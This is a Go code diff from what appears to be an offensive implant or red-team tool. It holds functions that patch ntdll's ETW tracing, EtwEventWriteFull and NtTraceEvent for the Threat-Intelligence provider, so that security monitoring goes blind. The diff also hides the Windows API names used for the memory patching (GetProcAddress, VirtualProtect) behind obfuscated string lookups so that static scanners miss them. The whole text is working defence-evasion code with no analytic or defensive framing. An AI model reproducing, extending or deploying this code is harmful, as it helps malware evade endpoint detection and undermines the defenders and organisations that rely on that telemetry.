@@ -14,7 +14,7 @@ const (
 
 var (
 	ntdllETWTI            = syscall.NewLazyDLL("ntdll.dll")
-	procEtwEventWriteFull = ntdllETWTI.NewProc("EtwEventWriteFull")
+	procEtwEventWriteFull = ntdllETWTI.NewProc(s(SProcEtwFull))
 )
 
 // ETW TI GUID bytes in little-endian GUID format
@@ -47,9 +47,9 @@ func runEvasionETWTI() string {
 
 func patchEtwEventWriteFull() string {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := kernel32.NewProc("GetModuleHandleW")
-	getProcAddress := kernel32.NewProc("GetProcAddress")
-	virtualProtect := kernel32.NewProc("VirtualProtect")
+	getModuleHandle := kernel32.NewProc(s(SProcGModuleW))
+	getProcAddress := kernel32.NewProc(s(SProcGProcAddr))
+	virtualProtect := kernel32.NewProc(s(SProcVProtect))
 
 	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
 	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
@@ -81,9 +81,9 @@ func patchEtwEventWriteFull() string {
 
 func patchNtTraceEventETWTI() string {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := kernel32.NewProc("GetModuleHandleW")
-	getProcAddress := kernel32.NewProc("GetProcAddress")
-	virtualProtect := kernel32.NewProc("VirtualProtect")
+	getModuleHandle := kernel32.NewProc(s(SProcGModuleW))
+	getProcAddress := kernel32.NewProc(s(SProcGProcAddr))
+	virtualProtect := kernel32.NewProc(s(SProcVProtect))
 
 	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
 	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
